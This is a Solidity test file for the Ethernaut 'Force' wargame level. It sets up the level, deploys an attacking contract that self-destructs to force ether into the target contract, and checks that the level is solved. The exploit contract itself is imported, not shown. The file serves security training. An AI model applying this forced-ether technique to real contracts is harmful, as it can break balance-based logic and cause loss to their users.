pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Force/ForceHack.sol";
import "../Force/ForceFactory.sol";
import "../Ethernaut.sol";

interface CheatCodes {
  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called 
  function startPrank(address) external;
  // Resets subsequent calls' msg.sender to be `address(this)`
  function stopPrank() external;
  // Sets an address' balance
  function deal(address who, uint256 newBalance) external;
}

contract ForceTest is DSTest {
    CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        cheats.deal(eoaAddress, 5 ether);
    }

    function testForceHack() public {

        /////////////////
        // LEVEL SETUP //
        /////////////////

        ForceFactory forceFactory = new ForceFactory();
        ethernaut.registerLevel(forceFactory);
        cheats.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(forceFactory);
        Force ethernautForce = Force(payable(levelAddress));


        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Create the attacking contract which will self destruct and send ether to the Force contract
        ForceHack forceHack = (new ForceHack){value: 0.1 ether}(payable(levelAddress));


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        cheats.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}